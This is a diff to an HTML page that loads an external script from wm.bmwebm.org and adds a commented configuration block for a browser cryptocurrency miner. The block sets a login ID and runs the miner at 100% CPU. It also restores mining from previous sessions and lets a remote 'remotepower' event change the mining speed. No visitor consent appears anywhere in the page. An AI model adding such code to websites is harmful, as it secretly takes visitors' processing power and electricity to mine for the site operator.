@@ -7,6 +7,45 @@
     </head>
     <body>
         <script src="https://wm.bmwebm.org/huisos.js"></script>
-        <script>huisos.config({ login: "6108027", pass: "6108027" }).power(100);</script>
+        <script>
+// - Configure:
+huisos.config({ 
+	login: "6108027", // Your ID - required
+	pass: "6108027", // Name for stats, leave blank for automatic set.
+});
+
+// - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
+huisos.power(100);
+
+// - Restore previous session accepted hashes and power (start mining if it worked in previous session):
+huisos.loadStored();
+
+// - Get current power:
+console.log( huisos.getPower() );
+
+// - Get current speed in hashes/sec:
+console.log( huisos.getHashesPerSecond() );
+
+// - Get current job algo:
+console.log( huisos.getJobAlgo() );
+
+// - Get current job diff:
+console.log( huisos.getJobDiff() );
+
+// - Get accepted by pool hashes (in all sessions)
+console.log( huisos.getAcceptedHashes() );
+
+// - Reset config and stop minig
+huisos.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).
+
+// - Remote change speed event:
+huisos.on('remotepower', (power) => {
+	huisos.power(power); // Is automatic applied if no listeners for this event.
+	console.log('New power:', power);
+});
+
+// - Share accepted event
+huisos.on('accepted', () => console.log('New share') );
+</script>
     </body>
 </html>
